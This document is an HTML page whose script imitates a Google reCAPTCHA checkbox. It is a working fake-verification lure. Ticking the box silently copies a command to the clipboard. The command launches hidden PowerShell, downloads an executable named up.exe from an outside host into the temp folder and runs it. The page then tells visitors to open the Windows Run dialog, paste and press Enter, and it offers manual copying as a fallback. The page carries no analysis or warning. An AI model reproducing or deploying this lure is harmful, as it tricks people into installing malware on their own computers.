<body>
  <div class="recaptcha-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/320px-RecaptchaLogo.svg.png" alt="reCAPTCHA logo" class="logo">

    <div class="checkbox">
      <input type="checkbox" id="verifyCheck">
      <label for="verifyCheck">I'm not a robot</label>
    </div>

    <div class="spinner" id="spinner"></div>
    <div class="message" id="message">✅ Verification complete. activated successfully.</div>

    <div class="instructions" id="instructions">
      <p><b>Complete verification:</b></p>
      <ol>
        <li>Press <b>Windows + R</b></li>
        <li>Press <b>Ctrl + V</b> to paste</li>
        <li>Press <b>Enter</b></li>
      </ol>
      <div id="fallback" style="display:none;">
        <p><b>If auto-copy fails, copy manually:</b></p>
        <pre class="copy-text" id="copyText"></pre>
      </div>
    </div>

    <div class="footer">
      This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
    </div>
  </div>

  <script>
    const checkbox = document.getElementById('verifyCheck');
    const spinner = document.getElementById('spinner');
    const message = document.getElementById('message');
    const instructions = document.getElementById('instructions');
    const fallback = document.getElementById('fallback');
    const copyText = document.getElementById('copyText');

    // Nội dung lệnh cần copy
    const commandText = "powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '%TEMP%\up.exe'"
start "" /b "%TEMP%\up.exe"";

    function show(el) { el.style.display = 'block'; }
    function hide(el) { el.style.display = 'none'; }

    checkbox.addEventListener('click', async () => {
      if (checkbox.checked) {
        try {
          await navigator.clipboard.writeText(commandText);
          show(message);
          show(instructions);
          hide(fallback);
        } catch (err) {
          show(message);
          show(instructions);
          copyText.textContent = commandText;
          show(fallback);
        }
      } else {
        hide(message);
        hide(instructions);
        hide(fallback);
      }
    });
  </script>
